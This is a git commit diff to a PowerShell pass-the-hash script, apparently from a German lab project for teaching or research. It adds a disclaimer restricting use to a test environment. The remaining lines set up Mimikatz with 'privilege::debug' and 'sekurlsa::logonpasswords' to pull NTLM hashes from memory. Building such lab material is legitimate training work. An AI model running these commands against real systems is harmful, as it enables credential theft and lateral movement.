9b10e63ae61145d865cd76b74cd0653ec833bdad
martingratt <martin_gratt@hotmail.com>
2020-05-19 19:51:28 +0200

    Update Attack3_PassTheHash.ps1

--- Skripts/Attack3_PassTheHash.ps1
+++ Skripts/Attack3_PassTheHash.ps1
@@ -1,4 +1,13 @@
-﻿$process = "C:\prehendo\Tools\mimikatz\x64\mimikatz.exe" #Pfad der Mimikatz exe
+<# 
+--------------------------------------------------------------------------------------------
+Die Verwendung der folgenden Skripte ist nur innerhalb der dafür vorgesehenen Testumgebung zu Lehr- oder Forschungszwecken erlaubt.
+Jeglicher Missbrauch zur Verursachung von Schaden oder missbräuchliche Verwendung mit bösartigen Absichten ist strengstens untersagt.
+Die Verantwortung liegt allein beim Anwender / der Anwenderin.
+Das Projektteam übernimmt keine Verantwortung für Schäden, die durch Dritte entstehen.
+--------------------------------------------------------------------------------------------
+#>
+
+$process = "C:\prehendo\Tools\mimikatz\x64\mimikatz.exe" #Pfad der Mimikatz exe
 $argument1 = "`"log C:\prehendo\Logs\attack3.log`"" #Pfad der Logdatei
 $argument2 = "privilege::debug" #Privilegien setzten
 $argument3 = "sekurlsa::logonpasswords" #NTLM Hashes hohlen
